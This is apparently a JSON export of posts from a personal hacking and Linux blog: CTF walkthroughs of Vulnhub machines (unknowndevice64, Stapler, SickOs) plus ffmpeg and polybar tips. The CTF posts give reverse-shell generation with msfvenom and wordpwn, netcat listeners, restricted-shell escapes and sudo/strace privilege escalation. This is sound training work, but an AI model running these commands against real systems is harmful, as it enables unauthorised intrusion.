&#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ &#x2F; \\ ( c | o | n | g | r | a | t | u | l | a | t | i | o | n | s ) \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; \\_&#x2F; flag3: cybersploit&#123;Z3X21CW42C4 many many congratulations !&#125; if you like it share with me https:&#x2F;&#x2F;twitter.com&#x2F;cybersploit1. Thanks ! ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF unknowndevice64-1","slug":"CTF unknowndevice64-1","date":"2022-01-20T02:51:00.000Z","updated":"2023-04-12T14:14:27.271Z","comments":true,"path":"/post/CTF unknowndevice64-1.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20unknowndevice64-1.html","excerpt":"","text":"IntroDescription: unknowndevice64 v1.0 is a medium level boot2root challenge. The OVA has been tested on both VMware and Virtual Box. Difficulty: Intermediate Flags: Your Goal is to get root and read /root/flag.txt Networking: DHCP: Enabled IP Address: Automatically assigned Hint: Follow your intuitions … and enumerate! and for any questions, feel free to contact me on Twitter: @unknowndevice64 Happy Hacking..!!! Scannetdiscover 192.168.0.40 nmapnmap 192.168.0.40 -sV -p- python http server In the source code we can found this picture. http://192.168.0.40:31337/key_is_h1dd3n.jpgIt’s interesting, I will do someting on it later. niktonothing interesting Metadatadentify -verbose key_is_h1dd3n.jpg Nothing interesting file key_is_h1dd3n.jpg key_is_h1dd3n.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 300x300, components 1 Crack key_is_h1dd3n.jpgI use this tool.https://github.com/Paradoxis/StegCracker echo &quot;h1dd3n&quot; &gt; ahhh.txt stegcracker key_is_h1dd3n.jpg ahhh.txt ++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;+++++++++++++++++.—————–.&lt;—————-.–.++++++.———.&gt;———————–.&lt;&lt;+++.++.&gt;+++++.–.++++++++++++.&gt;++++++++++++++++++++++++++++++++++++++++.—————–. This is the output, the password was h1dd3n, it’s write in the file name lol. decoder detectorhttps://www.dcode.fr/identification-chiffrement I have to use brainfuck. Decode brainfuckSeriously, I was stuck on this web page for 2 minutes because I was unable to see the output on the left… ud64:1M!#64@ud sshssh ud64@192.168.0.40 -p 1337 password:1M!#64@ud It’s broken everywhere.-rbash: /bin/ls: restricted: cannot specify `/‘ in command namesBut I can use vi. $PATHThe PATH variable is almost empty. ud64@unknowndevice64_v1:~$ echo $PATH &#x2F;home&#x2F;ud64&#x2F;prog ud64@unknowndevice64_v1:~$ export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;bin -rbash: PATH: readonly variable There is something in prog.I use TAB to show what is in the directory. ud64@unknowndevice64_v1:~$ ls .bash_history .screenrc Downloads&#x2F; Public&#x2F; web&#x2F; .bash_profile Desktop&#x2F; Music&#x2F; Videos&#x2F; .config&#x2F; Documents&#x2F; Pictures&#x2F; prog&#x2F; ud64@unknowndevice64_v1:~$ ls prog&#x2F; date id vi whoami I have edited the .bash_profile to change the PATH. PATH&#x3D;$HOME&#x2F;prog:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;bin Some commands still don’t work but it’s good for python python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; Now everything is working. sudo -lud64@unknowndevice64_v1:~$ sudo -l User ud64 may run the following commands on unknowndevice64_v1: (ALL) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;sysud64 Let’s try it. sudo &#x2F;usr&#x2F;bin&#x2F;sysud64 su Oh god, it’s broken everywhere, but I’m root, gg wp. sysud64ud64@unknowndevice64_v1:~$ sudo &#x2F;usr&#x2F;bin&#x2F;sysud64 -V strace -- version 4.22 Copyright (c) 1991-2018 The strace developers &lt;https:&#x2F;&#x2F;strace.io&gt;. This is free software; see the source for copying conditions. There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. Optional features enabled: stack-unwind stack-demangle m32-mpers mx32-mpers It’s strace. let’s see in gtfobin what we can do.https://gtfobins.github.io/gtfobins/strace/strace -o /dev/null /bin/shSo for me it will be: sudo &#x2F;usr&#x2F;bin&#x2F;sysud64 -o &#x2F;dev&#x2F;null &#x2F;bin&#x2F;sh ) ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"Record screen with ffmpeg","slug":"Record screen with ffmpeg","date":"2022-01-19T07:56:00.000Z","updated":"2023-04-12T14:14:27.274Z","comments":true,"path":"/post/Record screen with ffmpeg.html","link":"","permalink":"https://peanutstick.github.io/post/Record%20screen%20with%20ffmpeg.html","excerpt":"","text":"ffmpeg -video_size 1920x1080 -framerate 60 / # Resolution + framerate-f x11grab -i :0.0+0,0 / # screen-f pulse -i alsa_output.pci-0000_00_1f.3.analog-stereo.monitor test3.mkv # Audio You can have the audio input with: pacmd list-sources ffmpeg -video_size 1920x1080 -framerate 60 -f x11grab -i :0.0+0,0 -f pulse -i alsa_output.pci-0000_00_1f.3.analog-stereo.monitor test3.mkv ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"ffmpeg","slug":"ffmpeg","permalink":"https://peanutstick.github.io/tags/ffmpeg/"}]},{"title":"CTF Stapler","slug":"CTF Stapler","date":"2022-01-15T07:07:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/CTF Stapler.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Stapler.html","excerpt":"","text":"Discoveryhttps://www.vulnhub.com/entry/stapler-1,150/ Scanningnetdiscoversudo netdiscover 192.168.0.34 nmapsudo nmap 192.168.0.34 -sV -p- 12 open ports: ftpftp connect 192.168.0.34 Connected to ftp@192.168.0.34.220-220-|—————————————————————————————–|220-| Harry, make sure to update the banner when you get a chance to show who has access here |220-|—————————————————————————————–|220- We have a username: harry ftp&gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 107 Jun 03 2016 note 226 Directory send OK. ftp&gt; get note 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for note (107 bytes). 226 Transfer complete. 107 bytes received in 0,000452 seconds (231 kbytes&#x2F;s) Let’s what is in the note. cat ~&#x2F;note &#96;Elly&#96;, make sure you update the payload information. Leave it in your FTP account once your are done, &#96;John&#96;. Now we have 3 usersneme: harry, Elly and John We have to connect with Elly to find the &#96;payload information&#96;. httpdirbAfter a scan on the port 80 we have this: ---- Scanning URL: http:&#x2F;&#x2F;192.168.1.27:80&#x2F; ---- + http:&#x2F;&#x2F;192.168.1.27:80&#x2F;.bashrc (CODE:200|SIZE:3771) + http:&#x2F;&#x2F;192.168.1.27:80&#x2F;.profile (CODE:200|SIZE:675) .bashrc # If not running interactively, don&#39;t do anything case $- in *i*) ;; *) return;; esac # don&#39;t put duplicate lines or lines starting with space in the history. # See bash(1) for more options HISTCONTROL&#x3D;ignoreboth # append to the history file, don&#39;t overwrite it shopt -s histappend # for setting history length see HISTSIZE and HISTFILESIZE in bash(1) HISTSIZE&#x3D;1000 HISTFILESIZE&#x3D;2000 # check the window size after each command and, if necessary, # update the values of LINES and COLUMNS. shopt -s checkwinsize # If set, the pattern &quot;**&quot; used in a pathname expansion context will # match all files and zero or more directories and subdirectories. #shopt -s globstar # make less more friendly for non-text input files, see lesspipe(1) [ -x &#x2F;usr&#x2F;bin&#x2F;lesspipe ] &amp;&amp; eval &quot;$(SHELL&#x3D;&#x2F;bin&#x2F;sh lesspipe)&quot; # set variable identifying the chroot you work in (used in the prompt below) if [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r &#x2F;etc&#x2F;debian_chroot ]; then debian_chroot&#x3D;$(cat &#x2F;etc&#x2F;debian_chroot) fi # set a fancy prompt (non-color, unless we know we &quot;want&quot; color) case &quot;$TERM&quot; in xterm-color|*-256color) color_prompt&#x3D;yes;; esac # uncomment for a colored prompt, if the terminal has the capability; turned # off by default to not distract the user: the focus in a terminal window # should be on the output of commands, not on the prompt #force_color_prompt&#x3D;yes if [ -n &quot;$force_color_prompt&quot; ]; then if [ -x &#x2F;usr&#x2F;bin&#x2F;tput ] &amp;&amp; tput setaf 1 &gt;&amp;&#x2F;dev&#x2F;null; then # We have color support; assume it&#39;s compliant with Ecma-48 # (ISO&#x2F;IEC-6429). (Lack of such support is extremely rare, and such # a case would tend to support setf rather than setaf.) color_prompt&#x3D;yes else color_prompt&#x3D; fi fi if [ &quot;$color_prompt&quot; &#x3D; yes ]; then PS1&#x3D;&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ &#39; else PS1&#x3D;&#39;$&#123;debian_chroot:+($debian_chroot)&#125;\\u@\\h:\\w\\$ &#39; .profil if [ -n &quot;$BASH_VERSION&quot; ]; then # include .bashrc if it exists if [ -f &quot;$HOME&#x2F;.bashrc&quot; ]; then . &quot;$HOME&#x2F;.bashrc&quot; fi fi # set PATH so it includes user&#39;s private bin if it exists if [ -d &quot;$HOME&#x2F;bin&quot; ] ; then PATH&#x3D;&quot;$HOME&#x2F;bin:$PATH&quot; fi BrowsingOn the port 12380 we have this. We have this comment:A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! Now we have 5 usernames:harry, Elly, Tim, John and Zoe Nikto on 12380+ Entry &#39;&#x2F;admin112233&#x2F;&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + Entry &#39;&#x2F;blogblog&#x2F;&#39; in robots.txt returned a non-forbidden or redirect HTTP code (200) + &#x2F;phpmyadmin&#x2F;: phpMyAdmin directory found + &quot;robots.txt&quot; contains 2 entries which should be manually viewed. You have to entry with https, or it will fail.In the robots.txt we have /admin112233/ and /blogblog/https://192.168.0.34:12380/admin112233/: https://192.168.0.34:12380/blogblog/: It’s using wordpress, here is the login page:https://192.168.0.34:12380/blogblog/wp-login.php wpscanwpscan --disable-tls-checks --url https:&#x2F;&#x2F;192.168.0.34:12380&#x2F;blogblog&#x2F; --enumerate ap --enumerate at --enumerate u --enumerate vp --enumerate cb Upload directory has listing enabled: https://192.168.0.34:12380/blogblog/wp-content/uploads/WordPress version 4.2.1 identified (Insecure, released on 2015-04-27). wpscan --disable-tls-checks --url https:&#x2F;&#x2F;192.168.0.34:12380&#x2F;blogblog&#x2F; --enumerate u We have some users.tim, kathy, scott, heather, peter, elly, barry, harry, John Smith, john, garryThe main user is john: wpscan –url https://192.168.0.34:12380/blogblog/ –wordlist ~/Documents/wordlist/rockyou.txt –username John –threads 100It’s not working Port 666On the port 666 we have this. Port 139139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) It’s a samba server. I found nothing interesting in the backups.You can also use nautilus to download and browse in the smb server. ExploitBrute force metasploitI’ve done a bruteforce with metasploit with the wordlist rockyou and the user john, because he is the one who manage the website.The password is incorrect. upload a revers shellYou can upload files in wordpress.https://192.168.0.34:12380/blogblog/wp-admin/plugin-install.php?tab=upload I’v tried with this one:https://docs.j7k6.org/wordpress-malicious-plugin-reverse-shell-metasploit/ wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wetw0rk&#x2F;malicious-wordpress-plugin&#x2F;master&#x2F;wordpwn.py python wordpwn.py 192.168.0.21 4444 Y Then, unzip the file and upload wetw0rk_maybe.phpOpen it via this link:https://192.168.0.34:12380/blogblog/wp-content/uploads/ Now you should have a meterpreter. linenum.sh Hostname: red.initech Linux: 4.4.0-21-generic Distribution: Ubuntu 16.04 LTS &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( users )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] usr020 Are there other users in administrative groups?................. yes! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] fst000 Writable files outside user&#39;s home.............................. yes! [*] fst010 Binaries with setuid bit........................................ yes! [*] fst080 Can we read subdirectories under &#x2F;home?......................... yes! &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( network )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; [*] net000 Services listening only on localhost............................ yes! I think the kernel can be exploited but I have to finish the reco first. find &#x2F;home peter is diferent, I think he can use sudo./home/peter/.sudo_as_admin_successful Let’s see deeper. cat &#x2F;home&#x2F;*&#x2F;.bash_hi* We have JKanode and peter, peter can use sudo so let’s go for peter. sshpass -p thisimypassword ssh JKanode@localhost apt-get install sshpass sshpass -p JZQuyIN5 peter@localhost SSH peterssh peter@192.168.0.34 JZQuyIN5 Enum sudosudo -l User peter may run the following commands on red: (ALL : ALL) ALL sudo su We are root. Let’s get this flag.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"Create a polybar module","slug":"Create a polybar module","date":"2022-01-13T05:09:00.000Z","updated":"2023-04-12T14:14:27.251Z","comments":true,"path":"/post/Create a polybar module.html","link":"","permalink":"https://peanutstick.github.io/post/Create%20a%20polybar%20module.html","excerpt":"","text":"WhyI had xfce4 panel, and I miss some informations like the remaining battery. CodeConfig polybarIn the config file ./config.polybar/config. [module&#x2F;discharge] type &#x3D; custom&#x2F;script exec &#x3D; ~&#x2F;.config&#x2F;polybar&#x2F;discharge.sh format-underline &#x3D; $&#123;colors.white&#125; You also have to tell where gonna be the output.In the config file: modules-right &#x3D; filesystem xbacklight alsa pulseaudio wlan eth battery discharge date powermenu You have to add the name of your module, but it can be where you want. ScriptIn ./config/polybar/discharge.sh` #! &#x2F;bin&#x2F;bash a&#x3D;$(upower -i &#96;upower -e | grep &#39;BAT&#39;&#96; |grep &quot;time to&quot;) echo $a It’s ugly, I will change the text later. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[]},{"title":"Replacing xfce4 bar by Polybar","slug":"Replacing xfce4 bar by Polybar","date":"2022-01-12T06:57:00.000Z","updated":"2023-04-12T14:14:27.274Z","comments":true,"path":"/post/Replacing xfce4 bar by Polybar.html","link":"","permalink":"https://peanutstick.github.io/post/Replacing%20xfce4%20bar%20by%20Polybar.html","excerpt":"","text":"WhyBecause I don’t use the menu of xfce and the the display of my desktops is a bit ugly. I have dmenu to run everythings I need.I would like to use pywal on my polybar. It can look a bit stupid because if I don’t use the xfce4 bar and WM why do I still keep it?It’s because with my last setup (I3 + polybar) I had 2 hours of battery max, now I’m at 6. HowInstall PolybarI already have polybar. sh ~&#x2F;.config&#x2F;polybar&#x2F;launch.sh If yiu have an error you have to recompile polybar. This is how it’s look like. This is the instalation guide.https://wiki.archlinux.org/title/Polybar#Installation Set polybar at startupI use BSPWM so I have to edit my bspwmrc.~/.config/bspwm/bspwmrc $HOME&#x2F;.config&#x2F;polybar&#x2F;launch.sh For me it’s not working, I have to lunch it via xfce4.I have to open xfce4 setting manager and sessions and startup. Config polybarwalI want it to work with wal, if I change my walpaper every thing have to change. This is how you can get the colors, it’s not needed here.. source &quot;$HOME&#x2F;.cache&#x2F;wal&#x2F;colors.sh&quot; echo $color0 #596398 instead of background = #222 you have to set background = $&#123;xrdb:color2&#125;I’m testing it with polybar example. background-alt &#x3D; $&#123;xrdb:color2&#125; background &#x3D; $&#123;xrdb:color1&#125; foreground &#x3D; $&#123;xrdb:color0&#125;f foreground-alt &#x3D; $&#123;xrdb:color0&#125; primary &#x3D; $&#123;xrdb:color5&#125; secondary &#x3D; $&#123;xrdb:color5&#125; alert &#x3D; $&#123;xrdb:color7&#125; ShapeRemove xfce4 panelI don’t see how I can disable it at startup.I can add other panels but I can’t remove the last one,so I made an empty and tinny panel with 100% opacity, he is in the corner of my screen.I feel like I’m not doing it right xD. IsuesAfter a reboot, et was broken, dmenu, bspwm, nitrogen and plybar was gone.And the shortcuts don’t work too, I had to open a terminal to fix it.Right click on the desktop &gt; terminal &gt; kill xfce4wm &gt; statr bspwm.This is how it’s look like. I fix my problem with polybar, I had something wrong in the config file.now I have to fix netrogen.I’m gonna reboot to see if it really work.And still not working. bspwm dmenu shortcutsRight click on the desktop &gt; terminal &gt; kill xfce4wm &gt; statr bspwm.dmenu and the shortcuts start with dmenu. nitrogenI had to kill xfce4 desktop, now nitrogen can run PicomThe blur was gone too, I have to set in at startup. polybarpolybar: error while loading shared libraries: libjsoncpp.so.24: cannot open shared object file: No such file or directory I have to rebuild it. git clone https:&#x2F;&#x2F;aur.archlinux.org&#x2F;polybar.git &amp;&amp; cd polybar &amp;&amp; makepkg -si This is how it should look like. I’m gonna reboot.And polybar don’t want to start, I should start it with an another startup file.And if it really don’t work I’m gonna create a service and enable it.Like the arch wiki said I had do modify the bspwmrc. ~.config/bspwm/bspwmrc $HOME&#x2F;.config&#x2F;polybar&#x2F;launch.sh Minor ProblemsNow I have an another problem, it’s working fine but it’s ugly.nitrogen restore the same wallpaper, no matter what, and the polybar don’t fetch the colors. I’ve created a commmand to set a random wallpaper. /usr/local/bin/rwalp ran&#x3D;$(find ~&#x2F;Pictures -type f \\( -iname \\*.jpg -o -iname \\*.png \\) | shuf -n 1) nitrogen --set-scaled &quot;$ran&quot; wal -i &quot;$ran&quot; pywalfox update Now I have to set rwalp at startup, I’m gonna use the bspwmrc file.The background don’t change, but everything else is ok, and I can change the background if I reload bspwm with CTRL+ALR+r, I love it. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"rice","slug":"rice","permalink":"https://peanutstick.github.io/tags/rice/"}]},{"title":"Cut an online video with ffmpeg","slug":"Cut an online video with ffmpeg","date":"2022-01-11T09:15:00.000Z","updated":"2023-04-12T14:14:27.271Z","comments":true,"path":"/post/Cut an online video with ffmpeg.html","link":"","permalink":"https://peanutstick.github.io/post/Cut%20an%20online%20video%20with%20ffmpeg.html","excerpt":"","text":"Cut an online video with ffmpegTips Linux Created At : 2022-01-11 03:15 Count:651 Views 👀 :2186 Why ffmpegThis tool can decode a video and re-encode it.You can remove the audio or the video, change the codec or use it to stream a file. TrickYou can input a youtube video without downloading it, to do this you need youtube-dl. youtube-dl -f best --get-url https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;H8w_Q57RQJc https:&#x2F;&#x2F;rr3---sn-n4g-ouxs.googlevideo.com&#x2F;videoplayback?expire&#x3D;1641865369&amp;ei&#x3D;OYzcYZ7yKNuMxN8P7feTIA&amp;ip&#x3D;93.23.130.72&amp;id&#x3D;o-AO5ZLYd00XMxzT1PjKh0Grtrh-mtnzmQcTys0s1Fx-UI&amp;itag&#x3D;18&amp;source&#x3D;youtube&amp;requiressl&#x3D;yes&amp;mh&#x3D;Q-&amp;mm&#x3D;31%2C29&amp;mn&#x3D;sn-n4g-ouxs%2Csn-n4g-jqbed&amp;ms&#x3D;au%2Crdu&amp;mv&#x3D;m&amp;mvi&#x3D;3&amp;pl&#x3D;21&amp;initcwndbps&#x3D;1763750&amp;vprv&#x3D;1&amp;mime&#x3D;video%2Fmp4&amp;ns&#x3D;R-N0c7jT-8ZOyFPbWVfuYpAG&amp;gir&#x3D;yes&amp;clen&#x3D;139964871&amp;ratebypass&#x3D;yes&amp;dur&#x3D;6538.507&amp;lmt&#x3D;1540303910458790&amp;mt&#x3D;1641842946&amp;fvip&#x3D;5&amp;fexp&#x3D;24001373%2C24007246&amp;c&#x3D;WEB&amp;txp&#x3D;5531432&amp;n&#x3D;tXjNIa-Hi2X8YEz&amp;sparams&#x3D;expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cvprv%2Cmime%2Cns%2Cgir%2Cclen%2Cratebypass%2Cdur%2Clmt&amp;sig&#x3D;AOq0QJ8wRgIhAPRj1ix2t8yS_B3M3QQaY0dCz4l-AaDkvF4r-sutJ50_AiEAk_E3dott1d4QWuDUqQkcSPtBRzIQi-rcNVeOV4Fg53E%3D&amp;lsparams&#x3D;mh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Cinitcwndbps&amp;lsig&#x3D;AG3C_xAwRQIgJInz5xNfosh2ocbFn41qMlAjCzdgTG0Xu3FjciwFCTkCIQCl7Jn3sVBFAmEnfXFmdH4k35tRXbMBB406wbAnyOLElQ%3D%3D If you click on the big link you can see the video without the youtube things. now ffmpeg can read the video with this link. The command to get the youtube link is too big, so I’m gonna wrap it into a variable. link&#x3D;$(youtube-dl -f best --get-url https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;H8w_Q57RQJc) ffmpeg -i $link output.mp3 My ideaI wanted to download every song in one youtube video, it was a pretty bad idea…For exemple I wanted the full Album of VA-11 HALL-A. I had to enter every title and every time code one by one.I made the script in one afternoon and I took some time to understand how the programe work. So, to download a specific moment of the video you have to use -ss with ffmpeg to indicate when it start,and use t for the duration or to for the next time code. ffmpeg -i &quot;$vid&quot; \\ -ss 0 -to 120 &quot;output.mp3&quot; So with it you can pick the song you like in theres lists on youtube. My scriptThis is my script, you have to guess how to use it, lol.It’s made by a pro so it will be easy ( ͡° ͜ʖ ͡°). vid&#x3D;$(youtube-dl -f best --get-url $1) listtime&#x3D;(&quot;0&quot;) listtitle&#x3D;() i&#x3D;0 while true do echo -e &quot;The end: &quot; read time echo -e &quot;The title: &quot; read title title&#x3D;str&#x3D;&quot;$&#123;title&#x2F;&#x2F; &#x2F;_&#125;&quot; listtime+&#x3D;(&quot;$time&quot;) listtitle+&#x3D;(&quot;$title&quot;) echo -e &quot;1: Continue &quot; echo -e &quot;2: Start download&quot; echo -n &quot;: &quot; read choix case $choix in 1) clear ;; 2) echo -n &quot;bye&quot; clear break ;; esac done i&#x3D;0 while [ $i -ne $&#123;#listtitle[@]&#125; ] do title&#x3D;$&#123;listtitle[$i]&#125; start&#x3D;$&#123;listtime[$i]&#125; ((i++)) end&#x3D;$&#123;listtime[$i]&#125; title&#x3D;$&#123;title:4&#125; ffmpeg -i &quot;$vid&quot; \\ -ss $start -to $end &quot;$&#123;title&#125;.mp3&quot; done EndDon’t do what I’ve done, it’s useless, it’s faster to download the musics on 1337 or somewhere else.you can use it if you like a song and want to pick this one amoug every songs. ©2021 Peanutstick’s Blog Built with Hexo and 3-hexo theme","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"ffmpeg","slug":"ffmpeg","permalink":"https://peanutstick.github.io/tags/ffmpeg/"}]},{"title":"Create a locale stream","slug":"Create a locale stream","date":"2022-01-10T01:18:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/Create a locale stream.html","link":"","permalink":"https://peanutstick.github.io/post/Create%20a%20locale%20stream.html","excerpt":"","text":"WhyBecause we can’t use the music bot on discord anymore.And a youtuber released a video yesterday where he show how to steal a stream on youtube, it’s Bugswriter.I don’t want to steal a stream, I just want to use ffmpeg like a chad and play with it. HowI want to use ffmpeg without ffserver, because ffserver has been removed on 2018-01-06.And a webserver, I tried with python SimpleHTTPServer but I can’t use it because I have the error 501.message Unsupported method (&#39;POST&#39;)SO I’m gonna use nginx What I’v doneCreate the web server.Upload the stream: ffmpeg -i weeb_music.webm -f mp3 &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;stream I don’t stream to http://localhost:80/stream because it’s not working well.And if I can do it, everyone can do it too and it’s not good.Maybe it’s possible to upload a revershell via ffmpeg and I will be fucked.So you can only read via the web server. ProblemsWhen I start the stream, he upload it very fast (50x).The output is not a stream but juste the file. If the file is loaded at 100% in my browser he will stop the download.But if it’s the half of the music the browser wont load the rest of the stream. What I should tryReduce the speed.Don’t erase the buffer because youtube don’t do it to,maybe I can create an index.html and embed the stream.Don’t use a file but a real stream, like the output of my browser or a video/music player.Use the stream of MCP server??I have to open the ports of my box, not the 80 or 8080 because of the bots.Read the stream with vlc and ffplayer.","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://peanutstick.github.io/tags/Linux/"}]},{"title":"CTF_SickOs","slug":"CTF_SickOs","date":"2022-01-09T07:15:00.000Z","updated":"2023-04-12T14:58:06.457Z","comments":true,"path":"/post/CTF_SickOs.html","link":"","permalink":"https://peanutstick.github.io/post/CTF_SickOs.html","excerpt":"","text":"Discovery[https://www.vulnhub.com/entry/sickos-11,132/] DescriptionThis CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment.This vm is very similar to labs I faced in OSCP.The objective being to compromise the network/machine and gain Administrative/root privileges on them. Objective…: Get /root/a0216ea4d51874464078c618298b1367.txt Scanningnetdiscoversudo netdiscover nmap Exploithttp-proxy Squid http proxy 3.1.19 [https://www.exploit-db.com/exploits/9951]Let’s use Metasploit. sudo msfconsole search squid Use the proxyI dont set the proxy in my browser because I want to try the dirbuster. export http_proxy&#x3D;&#39;http:&#x2F;&#x2F;192.168.0.26:3128&#39; curl http:&#x2F;&#x2F;192.168.0.26 gobustergobuster dir -x * -u http:&#x2F;&#x2F;192.168.0.26 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt /index (Status: 200) [Size: 21]/connect (Status: 200) [Size: 109]/robots (Status: 200) [Size: 45]/server-status (Status: 403) [Size: 293] connect is a python file 1 #!/usr/bin/python 2 3 print \"I Try to connect things very frequently\\n\" 4 print \"You may want to try my services\" I don’t know what to do with it. In robots.txt User-agent: * Disallow: &#x2F; Dissalow: &#x2F;wolfcms Let’s see what is wolfcms and see if we can exploit it. https://www.exploit-db.com/exploits/38000 http:&#x2F;&#x2F;192.168.0.26&#x2F;wolfcms&#x2F;?&#x2F;admin&#x2F;plugin&#x2F;file_manager&#x2F;browse&#x2F; Now we have a login page, let’s try with admin/admin. metasploitI’m gonna upload a revers shell, usualy I use thoses from pentestmonkey with netcat, but this time I’m gonna use metasploit. msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.21 LPORT&#x3D;4444 -f raw -o shell.php And upload the shell.php in the website. Run msfconsole to start the listener: use exploit&#x2F;multi&#x2F;handler set LHOST &lt;$LOCAL_IP&gt; set LPORT &lt;$LOCAL_PORT&gt; set PAYLOAD php&#x2F;meterpreter&#x2F;reverse_tcp exploit I don’t know where is my error, I just want a shell so bye bye metasploit. Reverse shellI’m gonna download the reverse shell from pentestmonkey.[https://github.com/pentestmonkey/php-reverse-shell]And change the values. you can also replace the shell.[https://netsec.ws/?p=337] Upload the shell and listen with netcat. netcat -nlvp 4444 let’s upgrade the shell with this. python -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; ReconLet’s upload the LinEnum script and run it. I want to create a txt file because it’s hard to read. It’s too hard to read I’m gonna find something 